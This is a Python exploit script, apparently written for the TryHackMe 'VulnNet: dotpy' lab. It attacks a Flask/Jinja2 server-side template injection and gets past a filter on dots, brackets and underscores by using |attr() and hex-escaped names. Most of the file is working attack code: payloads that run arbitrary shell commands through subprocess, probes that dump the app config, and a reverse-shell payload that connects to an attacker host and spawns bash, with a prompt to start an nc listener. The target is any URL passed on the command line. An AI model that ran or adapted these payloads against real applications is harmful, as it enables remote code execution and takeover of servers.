#!/usr/bin/env python3
# Author: Web3-Serializer
# TryHackMe — VulnNet: dotpy | Flask/Jinja2 SSTI
# Blocked chars: . [ ] _  → bypass via |attr() + \x5f hex escape
# deps: pip install requests colorama

import sys
import argparse
import urllib.parse
import requests
from colorama import init as colorama_init

requests.packages.urllib3.disable_warnings()

class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; GREEN = "\033[92m"
    CYAN  = "\033[96m"; YELLOW = "\033[93m"; RED = "\033[91m"; DIM = "\033[2m"

def ok(m):   print(f"  {C.GREEN}[+]{C.RESET} {m}")
def info(m): print(f"  {C.CYAN}[*]{C.RESET} {m}")
def warn(m): print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def err(m):  print(f"  {C.RED}[-]{C.RESET} {m}")

def banner():
    colorama_init()
    print(C.GREEN + r"""
  ██████╗███████╗████████╗██╗
 ██╔════╝██╔════╝╚══██╔══╝██║
 ╚█████╗ ███████╗   ██║   ██║
  ╚═══██╗╚════██║   ██║   ██║
 ██████╔╝███████║   ██║   ██║
 ╚═════╝ ╚══════╝   ╚═╝   ╚═╝
    """ + C.RESET)
    print(f"  {C.BOLD}Flask/Jinja2 SSTI — VulnNet dotpy{C.RESET}")
    print(f"  {C.DIM}Blocked: . [ ] _  → |attr() + \\x5f bypass · Author: Web3-Serializer{C.RESET}\n")


def make_cmd_payload(cmd):
    cmd_hex = "".join(f"\\x{ord(c):02x}" for c in cmd)
    inner = (
        f"()|attr('\\x5f\\x5fclass\\x5f\\x5f')"
        f"|attr('\\x5f\\x5fbase\\x5f\\x5f')"
        f"|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()"
        f"|attr('pop')(401)('{cmd_hex}',shell=True,stdout=-1)"
        f"|attr('communicate')()"
    )
    return "{{" + inner + "}}"


def make_revshell_payload(lhost, lport):
    cmd = (
        f"python3 -c 'import os,pty,socket;s=socket.socket();"
        f"s.connect((\"{lhost}\",{lport}));"
        f"[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    )
    cmd_hex = "".join(f"\\x{ord(c):02x}" for c in cmd)
    inner = (
        f"()|attr('\\x5f\\x5fclass\\x5f\\x5f')"
        f"|attr('\\x5f\\x5fbase\\x5f\\x5f')"
        f"|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()"
        f"|attr('pop')(401)('{cmd_hex}',shell=True,stdout=-1)"
        f"|attr('communicate')()"
    )
    return "{{" + inner + "}}"


PROBE_PAYLOADS = [
    ("math eval",   "{{6*7}}"),
    ("config dump", "{{config}}"),
    ("request url", "{{request|attr('url')}}"),
    ("subclasses",  "{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}"),
    ("rce id",       make_cmd_payload("id")),
    ("rce whoami",   make_cmd_payload("whoami")),
    ("rce hostname", make_cmd_payload("hostname")),
]

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36"}
WAF_SIGS = ["your request has been blocked", "blocked", "forbidden"]


def is_blocked(text, code):
    return any(s in text.lower() for s in WAF_SIGS) or code in (406, 429)


def extract_reflection(text):
    for marker in ["No results for ", "results for "]:
        if marker in text:
            start = text.index(marker) + len(marker)
            end = text.find("<", start)
            return text[start:end].strip() if end > start else text[start:start+300].strip()
    return None


def is_interesting(text):
    if extract_reflection(text):
        return True
    return any(c in text for c in ["uid=", "root", "web", "Config", "SECRET", "subclass", "b'("])


def inject(base, payload, session_cookie, proxy, timeout=10):
    url = f"{base.rstrip('/')}/{urllib.parse.quote(payload, safe='')}"
    headers = {**HEADERS, "Cookie": f"session={session_cookie}"} if session_cookie else HEADERS
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=timeout)
        return r.status_code, r.text, is_blocked(r.text, r.status_code), url
    except requests.exceptions.ConnectionError:
        return 0, "connection error", True, url
    except requests.exceptions.Timeout:
        return 0, "timeout", True, url


def run_probe(base, session_cookie, proxy, show_all):
    info(f"Target  : {base}")
    info(f"Mode    : probe\n")
    hits = []

    for label, payload in PROBE_PAYLOADS:
        code, body, blocked, url = inject(base, payload, session_cookie, proxy)
        if blocked:
            warn(f"BLOCKED  [{label}]")
            continue
        reflection = extract_reflection(body)
        if is_interesting(body):
            ok(f"HIT      [{label}]")
            ok(f"Reflected: {reflection or body[:300]}\n")
            hits.append((label, url, reflection or body[:300]))
        elif show_all:
            info(f"{code}  [{label}]  {(reflection or body[:150])}")

    if not hits:
        warn("No hits — cookie may be expired, or try a different base path")


def run_cmd(base, session_cookie, proxy, cmd):
    info(f"Target  : {base}")
    info(f"Command : {cmd}\n")
    payload = make_cmd_payload(cmd)
    code, body, blocked, url = inject(base, payload, session_cookie, proxy)
    if blocked:
        err("Blocked")
        return
    reflection = extract_reflection(body)
    ok(f"HTTP {code}")
    ok(f"Output: {reflection or body[:500]}")


def run_revshell(base, session_cookie, proxy, lhost, lport):
    info(f"Target  : {base}")
    info(f"Reverse : {lhost}:{lport}\n")
    warn(f"Start listener: nc -lvnp {lport}")
    input("  Press Enter when ready...")
    payload = make_revshell_payload(lhost, lport)
    inject(base, payload, session_cookie, proxy)
    ok("Payload sent.")


def main():
    banner()
    parser = argparse.ArgumentParser(description="VulnNet dotpy SSTI exploit")
    parser.add_argument("-t", metavar="URL",    required=True)
    parser.add_argument("-c", metavar="COOKIE", default=None)
    parser.add_argument("-p", metavar="PROXY",  default=None)
    parser.add_argument("-a", action="store_true", help="show all responses")

    sub = parser.add_subparsers(dest="mode")
    sub.add_parser("probe")

    cmd_p = sub.add_parser("cmd")
    cmd_p.add_argument("-x", metavar="CMD", required=True)

    rev_p = sub.add_parser("revshell")
    rev_p.add_argument("-H", metavar="LHOST", required=True)
    rev_p.add_argument("-P", metavar="LPORT", required=True, type=int)

    args = parser.parse_args()

    if args.mode == "probe" or args.mode is None:
        run_probe(args.t, args.c, args.p, args.a)
    elif args.mode == "cmd":
        run_cmd(args.t, args.c, args.p, args.x)
    elif args.mode == "revshell":
        run_revshell(args.t, args.c, args.p, args.H, args.P)


if __name__ == "__main__":
    main()